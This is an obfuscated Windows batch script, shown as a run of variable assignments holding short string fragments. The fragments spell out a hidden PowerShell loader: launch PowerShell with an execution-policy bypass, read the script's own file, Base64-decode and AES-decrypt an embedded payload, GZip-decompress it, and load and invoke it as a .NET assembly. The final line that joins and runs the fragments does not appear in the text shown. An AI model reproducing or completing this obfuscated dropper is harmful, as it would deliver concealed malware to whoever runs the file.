@echo off
set "gpFhtrYfQP=\v"
set "AhPyncOyqO=\W"
set "HkRdDHmkgz=:\"
set "QcmgnYZPoY=rS"
set "DzoVLuoXnT= /"
set "AVJhfTCwgH=ow"
set "etAKoPiIPp=py"
set "LQCPzVmLlk=do"
set "SfcNmiKCSR=em"
set "wMZQXGxLZP=ll"
set "fgYhymdQZg=0\"
set "jPgHSyBnzE=po"
set "DEyTfuPoKJ=y "
set "LkrxKuBiuP=Wi"
set "fmSwxUnLbc=nd"
set "eusrYKEaYs=we"
set "jMHoyvsuGI=Sy"
set "jyoxSOouIJ=32"
set "BgCHrLpEzj=ws"
set "idEsrrtYHo=xe"
set "AzImiIkkwi=we"
set "QcmiYLVceE= C"
set "OguSWzEybR=he"
set "ulldNIaINO=Po"
set "hoOkAaqxIg=rs"
set "tAjdYPBkrR=st"
set "UEYwggOkJG=ll"
set "DXCpDFLPxD=s\"
set "IltOaXZzvy=1."
set "nifJFTfLWB=he"
set "eBxFKeKUcq=in"
set "XAUZOwYOLN=co"
set "bTtRZVaVhR=.e"
set "EbGkcSdJil= %~dp0"
set "lgpSGvVMrZ=cd"
set "MBdDlwxuca=$VrC"
set "hrisPoUKli=16] "
set "rJstTHOMnp=Y = "
set "vSEydgfGtO=..-1"
set "izqyqDkxyB=CFxo"
set "hyDvelrFiY=).Sp"
set "UlOlNkdMqR=]::("
set "WKECoFPVdE=.Mod"
set "spBmkYFnWJ=B = "
set "VAGklHwAUM=LY ="
set "ygaZfSnPfK=6esa"
set "CYvQOBSMSB=[Env"
set "ApSVEFBnfw=ode]"
set "atBuadYrOR=('da"
set "ZMGKzhkkdL=trea"
set "wUpdHhlgfA=; };"
set "EIDCjxElXb=y.Ci"
set "tXKfmdHkfx=B) {"
set "tgFrhKqroX=106u"
set "ZWcRwkRLEV=oint"
set "IcbLLuSHJW=zHhH"
set "ESpfWZBVyZ=m.IO"
set "fFKpGFKWFi=XM.I"
set "gitWCyfRXQ=('Tg"
set "fIhpOjREuS=]::C"
set "TMPCMfVCpH=eMVs"
set "vznvFQDYln=WWRl"
set "tvAReAzWWs=ispo"
set "RWSymizkAt=ddin"
set "CWrugXbGiN=ZckP"
set "SawDBKtFRO=VrCL"
set "SvhDqYcoMF=ptog"
set "LZVetPOhOQ=1..-"
set "aERqibGksj=Secu"
set "vhgYBdLCoP= [Sy"
set "LaKPMCsznt=l5E7"
set "xItaFtErGa=)))"
set "iDTrKkosdg=RmAx"
set "wBiBuweeFE=Fina"
set "cBKpffEzzW=New-"
set "lfMEapJeCM=);$n"
set "qUIlblHZjt=VrCL"
set "JQhdxsUpfj= New"
set "ZDVwtGtImR=6] -"
set "dMbtWLGGDZ=m.IO"
set "qgfhfeCxcK=OcSJ"
set "oIkwNHcqZt=pStr"
set "AfQmrpChGU=Disp"
set "QAtRsqTLYJ=ss -"
set "CCKcnWqrJx=embl"
set "NhzeaGyZII=pose"
set "RQHrnEMvxI=rans"
set "qwlAtfIMfw=hy.A"
set "aPoOFNMmPq=PfwX"
set "RZiJghaYTX== [S"
set "nHswhfBhGq===')"
set "ojCjciGfuE=ert]"
set "epCeyVDzjx=('%~f0'"
set "IYwqJBDotj= '')"
set "SPpUGiaqbj=-4] "
set "vDYfaGgPGP=m(, "
set "DnKSJDlJEh=.Mem"
set "mqxzxxmBOS=KyDp"
set "mAKGNVtKtR=le  "
set "ndYDDzViJA=w.Su"
set "KkEScMJqnz=Syst"
set "tcPlYOkGKR=saBm"
set "ebaSVVneRZ=.Con"
set "hTJVfmDBQj=null"
set "sifaffmPaS=1] -"
set "JgENguTaPd=Comp"
set "QWRxdxIdyd=UV ="
set "WozNwGabME=.GZi"
set "tgugLQGZwS=-joi"
set "CEnAsHSUFZ=YxVw"
set "RvRrwUWLPU=join"
set "wtHjdfolQl=ck($"
set "tslmuTkZIV=dWRL"
set "qgmuoDENDL=y.Cr"
set "DwbroWBLmp=TllA"
set "fmPcvRWNbn=.Dis"
set "mgmtkGDKYr=rCLY"
set "XcnipKqMUs=ay()"
set "GiWETaADpB=..-1"
set "wXakTbItoP=yste"
set "MhdgIYcMOb='')("
set "ZKBNsDnWwD=fore"
set "iSnuVsiAFh=rCLY"
set "dONuSuMPqE=lit("
set "gnVgoNHeHt=rt]:"
set "UXaaKTVbUJ=stem"
set "DlDluXXGqU=join"
set "HuYXpMdbTG=ing("
set "AjMuuZElXi=fwXM"
set "oCQsNSTKMa=Conv"
set "KzTmjETRFQ=daeR"
set "GIKsfZWGHk=s75K"
set "XtJZUnxoDi=oL'["
set "kTlaHJrANQ=tem."
set "eIApCuoDoW='[-1"
set "MHxgsHuoMP=bypa"
set "dnsxnDuZfi=Y = "
set "rcbiDIdYod=Rlw "
set "kbGYPZyvAH==');"
set "fHffgmDeNF=$hgj"
set "YvDZmhiXWn=[]] "
set "LJNnosbsqH=();$"
set "mPpcerKItj=ew-O"
